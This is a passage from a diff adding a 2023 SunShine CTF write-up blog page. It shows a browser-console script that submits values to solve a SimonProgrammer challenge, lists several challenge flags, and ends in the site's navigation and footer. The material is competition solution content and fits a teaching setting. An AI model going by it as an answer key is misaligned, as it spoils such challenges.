class="number">1</span>:-<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(o)</span><br></pre></td></tr></table></figure>
+
+<p>The <code>o</code> that comes out of print() is thrown into the following script.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">current_frequencies_used_global=[<span class="string">&#x27;287&#x27;</span>, <span class="string">&#x27;397&#x27;</span>, <span class="string">&#x27;377&#x27;</span>, <span class="string">&#x27;1016&#x27;</span>, <span class="string">&#x27;1480&#x27;</span>, <span class="string">&#x27;214&#x27;</span>, <span class="string">&#x27;1296&#x27;</span>, <span class="string">&#x27;1823&#x27;</span>, <span class="string">&#x27;420&#x27;</span>, <span class="string">&#x27;1469&#x27;</span>, <span class="string">&#x27;1164&#x27;</span>, <span class="string">&#x27;1943&#x27;</span>, <span class="string">&#x27;653&#x27;</span>, <span class="string">&#x27;1024&#x27;</span>, <span class="string">&#x27;361&#x27;</span>, <span class="string">&#x27;1228&#x27;</span>, <span class="string">&#x27;1567&#x27;</span>, <span class="string">&#x27;110&#x27;</span>, <span class="string">&#x27;402&#x27;</span>, <span class="string">&#x27;259&#x27;</span>, <span class="string">&#x27;298&#x27;</span>, <span class="string">&#x27;200&#x27;</span>, <span class="string">&#x27;1228&#x27;</span>, <span class="string">&#x27;529&#x27;</span>, <span class="string">&#x27;1080&#x27;</span>, <span class="string">&#x27;524&#x27;</span>, <span class="string">&#x27;1503&#x27;</span>, <span class="string">&#x27;1704&#x27;</span>, <span class="string">&#x27;345&#x27;</span>, <span class="string">&#x27;186&#x27;</span>, <span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;107&#x27;</span>, <span class="string">&#x27;957&#x27;</span>, <span class="string">&#x27;486&#x27;</span>, <span class="string">&#x27;62&#x27;</span>, <span class="string">&#x27;254&#x27;</span>, <span class="string">&#x27;761&#x27;</span>, <span class="string">&#x27;1194&#x27;</span>, <span class="string">&#x27;482&#x27;</span>, <span class="string">&#x27;1781&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; current_frequencies_used_global.<span class="property">length</span>; j++) &#123;</span><br><span class="line">        current_frequencies_used_global[j]=current_frequencies_used_global[j].<span class="title function_">replace</span>(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        current_frequencies_used_global[j]=current_frequencies_used_global[j].<span class="title function_">replace</span>(<span class="string">&quot;.wav&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="title function_">submitFrequencies</span>(current_frequencies_used_global)</span><br></pre></td></tr></table></figure>
+<p>Just throw it to the console of F12 and it will get flag.</p>
+<p><img src="https://hackmd.io/_uploads/BydIJ6GZp.png"></p>
+<p><strong>FLAG :</strong> <code>sun&#123;simon_says_wait_that_was_a_mistake_what_do_you_mean_the_filenames_were_frequencies&#125;</code>  </p>
+<h3 id="SimonProgrammer-3"><a href="#SimonProgrammer-3" class="headerlink" title="SimonProgrammer 3"></a>SimonProgrammer 3</h3><hr>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Knowledge-Repository"><a href="#Knowledge-Repository" class="headerlink" title="Knowledge Repository"></a>Knowledge Repository</h3><hr>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="House-of-Sus"><a href="#House-of-Sus" class="headerlink" title="House of Sus"></a>House of Sus</h3><hr>
+<h3 id="Robot-Assembly-Line"><a href="#Robot-Assembly-Line" class="headerlink" title="Robot Assembly Line"></a>Robot Assembly Line</h3><hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BeepBoop-Blog"><span class="toc-number">1.0.1.</span> <span class="toc-text">BeepBoop Blog</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FLAG-sun-wh00ps-4ll-IDOR"><span class="toc-number">1.0.2.</span> <span class="toc-text">FLAG:sun{wh00ps_4ll_IDOR}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hotdog-Stand"><span class="toc-number">1.1.</span> <span class="toc-text">Hotdog Stand</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FLAG-sun-5l1c3d-p1cKl35-4nd-0N10N2"><span class="toc-number">1.1.1.</span> <span class="toc-text">FLAG:sun{5l1c3d_p1cKl35_4nd_0N10N2}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">2.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BeepBoop-Cryptography"><span class="toc-number">2.1.</span> <span class="toc-text">BeepBoop Cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FLAG-sun-exterminate-exterminate-exterminate"><span class="toc-number">2.1.1.</span> <span class="toc-text">FLAG:sun{exterminate-exterminate-exterminate}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">3.</span> <span class="toc-text">MISC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">4.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%98%8E-Array-of-Sunshine-%E2%98%80%EF%B8%8F"><span class="toc-number">4.1.</span> <span class="toc-text">😎 Array of Sunshine ☀️</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#slove-script"><span class="toc-number">4.1.1.</span> <span class="toc-text">slove script:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flag"><span class="toc-number">4.1.2.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flock-of-Seagulls-%F0%9F%95%8A%EF%B8%8F"><span class="toc-number">4.2.</span> <span class="toc-text">Flock of Seagulls 🕊️</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#slove-script-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">slove script:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flag-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bug-Spray-%F0%9F%90%9B%F0%9F%AA%B2%F0%9F%90%9E"><span class="toc-number">4.3.</span> <span class="toc-text">Bug Spray 🐛🪲🐞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#slove-script-2"><span class="toc-number">4.3.1.</span> <span class="toc-text">slove script:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flag-2"><span class="toc-number">4.3.2.</span> <span class="toc-text">Flag:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Scripting"><span class="toc-number">5.</span> <span class="toc-text">Scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DDR"><span class="toc-number">5.1.</span> <span class="toc-text">DDR</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#slove-script-3"><span class="toc-number">5.1.1.</span> <span class="toc-text">slove script:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flag-3"><span class="toc-number">5.1.2.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimonProgrammer-1"><span class="toc-number">5.2.</span> <span class="toc-text">SimonProgrammer 1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reversing"><span class="toc-number">6.</span> <span class="toc-text">Reversing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dill"><span class="toc-number">6.1.</span> <span class="toc-text">Dill</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FLAG-sun-ZGlsbGxpa2V0aGVwaWNrbGVnZXRpdD8K"><span class="toc-number">6.1.1.</span> <span class="toc-text">FLAG:sun{ZGlsbGxpa2V0aGVwaWNrbGVnZXRpdD8K}</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#After-the-End"><span class="toc-number"></span> <span class="toc-text">After the End</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics"><span class="toc-number">1.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-Effort-Wav-%F0%9F%8C%8A"><span class="toc-number">1.1.</span> <span class="toc-text">Low Effort Wav 🌊</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FLAG-sun-well-that-was-low-effort"><span class="toc-number">1.1.1.</span> <span class="toc-text">FLAG:sun{well_that_was_low_effort}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reversing-1"><span class="toc-number">2.</span> <span class="toc-text">Reversing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#First-Date"><span class="toc-number">2.1.</span> <span class="toc-text">First Date</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Scripting-1"><span class="toc-number">3.</span> <span class="toc-text">Scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SimonProgrammer-2"><span class="toc-number">3.1.</span> <span class="toc-text">SimonProgrammer 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimonProgrammer-3"><span class="toc-number">3.2.</span> <span class="toc-text">SimonProgrammer 3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Knowledge-Repository"><span class="toc-number">4.1.</span> <span class="toc-text">Knowledge Repository</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">5.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#House-of-Sus"><span class="toc-number">5.1.</span> <span class="toc-text">House of Sus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Robot-Assembly-Line"><span class="toc-number">5.2.</span> <span class="toc-text">Robot Assembly Line</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2023/10/14/sunshinectf/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2023/10/14/sunshinectf/&text=2023 SunShine CTF Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2023/10/14/sunshinectf/&title=2023 SunShine CTF Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2023/10/14/sunshinectf/&is_video=false&description=2023 SunShine CTF Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023 SunShine CTF Write Up&body=Check out this article: http://wha13.github.io/2023/10/14/sunshinectf/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2023/10/14/sunshinectf/&title=2023 SunShine CTF Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2023/10/14/sunshinectf/&title=2023 SunShine CTF Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2023/10/14/sunshinectf/&title=2023 SunShine CTF Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2023/10/14/sunshinectf/&title=2023 SunShine CTF Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2023/10/14/sunshinectf/&name=2023 SunShine CTF Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2023/10/14/sunshinectf/&t=2023 SunShine CTF Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
